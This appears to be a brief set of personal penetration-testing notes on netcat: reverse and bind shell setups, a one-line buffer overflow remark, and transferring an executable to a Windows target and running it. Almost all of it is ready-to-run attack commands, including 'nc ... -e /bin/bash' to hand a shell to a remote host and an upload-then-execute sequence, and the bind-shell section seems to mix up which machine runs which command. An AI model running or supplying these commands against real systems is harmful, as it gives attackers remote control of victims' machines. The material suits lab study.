# Reverse shell
Connection from the target to the attacker
//opening port with netcat on my system
nc -nvlp 4444
//or -n skip dns name resolution & verbose
nc -n -v 10.11.0.22 110

//establishing connection on the victims system
nc 192.168.0.6 4444 -e /bin/bash

//just to open connection, and chat
nc -nv 10.11.0.22 4444


# Bind shell
Connection from the attacker to the target  
//opening port with netcat on the target 
nc -nvlp 4444

//establishing connection on my pc
nc 192.168.0.6 4444 -e /bin/bash

# Buffer overflow
Local bo is not intereseting check for remote bo

# transfer files to windows
//on target system and redirect any file to incoming.exe
nc -nlvp 4444 > incoming.exe

//locate file
locate wget.exe

// transfer file => we need to wait for file being uploaded
nc -nv 10.11.0.22 4444 < /user/share/.../wget.exe

//on target but first abort nc
incoming.exe -v